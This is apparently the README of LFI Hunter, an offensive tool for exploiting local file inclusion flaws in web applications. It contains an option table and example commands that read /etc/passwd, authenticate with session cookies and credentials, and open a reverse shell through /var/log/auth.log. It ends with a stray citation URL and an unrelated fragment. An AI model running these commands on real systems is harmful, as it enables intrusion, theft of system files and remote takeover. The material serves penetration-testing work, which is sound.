# README.md for LFI Hunter

## Overview

**LFI Hunter** is a command-line tool for testing and exploiting Local File Inclusion (LFI) vulnerabilities in web applications. This tool is designed to assist ethical hackers and security researchers in assessing web application security by exploiting file inclusion vulnerabilities in a controlled environment.

## Features

- **Command-line Interface**: User-friendly interface with various options.
- **Authentication Support**: Test areas requiring login credentials.
- **File Reading**: Attempt to read sensitive files from the target machine.
- **Parameter Fuzzing**: Test for injection vulnerabilities.
- **Reverse Shell Setup**: Establish a reverse shell connection for deeper access.

## Installation

To use LFI Hunter, clone the repository from GitHub:

```bash
git clone https://github.com/jac11/LFI_Hunter.git
cd LFI_Hunter
```

## Usage

The basic syntax for running LFI Hunter is:

```bash
LFI_Hunter [OPTIONS]
```

### Options

| Option                  | Description                                                                                     |
|-------------------------|-------------------------------------------------------------------------------------------------|
| `-h`, `--help`          | Show help message and exit.                                                                    |
| `--man`                 | Show the man page.                                                                             |
| `-UV`, `--Vulnurl`      | Target URL for the vulnerable web application.                                                 |
| `--auth`                | Enable authentication mode.                                                                    |
| `-F`, `--filelist`      | Read from an LFI wordlist file.                                                                |
| `-C`, `--Cookie`        | Provide the login session cookie.                                                              |
| `-B`, `--base64`        | Enable decoding of base64-filtered PHP code.                                                   |
| `-R`, `--read`          | Specify a file to read from the target machine.                                                |
| `-UF`, `--UserForm`     | Specify the HTML login form username field.                                                    |
| `-PF`, `--PassForm`     | Specify the HTML login form password field.                                                    |
| `-P`, `--password`      | Specify a password for login attempts.                                                         |
| `-p`, `--readpass`      | Read a password from a file.                                                                   |
| `-LU`, `--loginurl`     | Provide the login URL for authentication mode.                                                 |
| `-U`, `--user`          | Specify a username for login attempts.                                                         |
| `-u`, `--readuser`      | Read a username from a specified file.                                                         |
| `-A`, `--Aggressiv`     | Enable aggressive mode to increase request speed.                                              |
| `-S`, `--shell`         | Set up a reverse shell connection to a specified IP address.                                   |
| `--port PORT`           | Set the port for netcat or reverse shell connections.                                          |
| `-Z`, `--fuzzing`       | Enable brute-force or fuzzing mode for parameter testing.                                      |
| `--config FILE`         | Use a configuration file with predefined options.                                              |

### Examples

1. **Basic URL Scan with Authentication**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -A -LU http://example.com/login.php -U admin -P password
   ```

2. **Use Base64 Decoding**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -B -Z
   ```

3. **Read /etc/passwd File**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /etc/passwd
   ```

4. **Setup Reverse Shell**:
   ```bash
   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
   ```

## Exit Status

- **0**: Successful execution.
- **1**: General error, such as invalid command input.
- **2**: Misuse of command options.

## Files

- **config.txt**: Configuration file storing default options, useful for automation.
- **lfi_wordlist.txt**: Wordlist for common paths and filenames.
- **fuzz_params.txt**: Wordlist for parameter fuzzing.

## Author

Developed by jac11. For issues or contributions, visit the [GitHub repository](https://github.com/jac11/LFI_Hunter).

## License

LFI Hunter is licensed for user use only, with no permission to modify any source code.

## Man Page Access

To access the man page with detailed information about usage and options, run:

```bash
python3 lfi_info.py --man
```

This will display all relevant information in a paginated format using the terminal's built-in capabilities.

---

This README provides an overview of how to install, use, and contribute to LFI Hunter while ensuring that users understand its capabilities and limitations.

Citations:
[1] https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/39151810/86d7026d-1fc5-4a40-a4fa-d3debb3714d7/lfi_info.py# LFI_Hunter

UPdate in progress
